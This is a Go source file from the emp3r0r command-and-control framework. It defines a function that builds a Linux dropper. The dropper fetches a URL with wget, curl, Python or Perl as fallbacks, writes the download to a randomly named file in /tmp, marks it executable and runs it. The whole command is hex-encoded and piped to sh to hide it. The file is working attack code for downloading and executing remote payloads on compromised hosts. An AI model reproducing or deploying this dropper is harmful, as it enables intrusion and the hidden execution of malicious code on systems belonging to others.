//go:build linux
// +build linux

package cc

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// bash_http_downloader download whatever from the url and execute it
func bash_http_downloader(url string) (dropper string) {
	cmd := `d() {
wget -q "$1" -O-||curl -fksL "$1"||python -c "import urllib;u=urllib.urlopen('${1}');print(u.read());"||python -c "import urllib.request;import sys;u=urllib.request.urlopen('$1');sys.stdout.buffer.write(u.read());"||perl -e "use LWP::Simple;\$resp=get(\"${1}\");print(\$resp);"
}
d '%s'>/tmp/%s&&chmod +x /tmp/%s&&/tmp/%s`
	dropper_name := util.RandStr(6)

	payload := fmt.Sprintf(cmd, url,
		dropper_name, dropper_name, dropper_name)

	// hex encoded payload
	payload = util.HexEncode(payload)
	dropper = fmt.Sprintf("echo -e \"%s\"|sh", payload)
	return
}
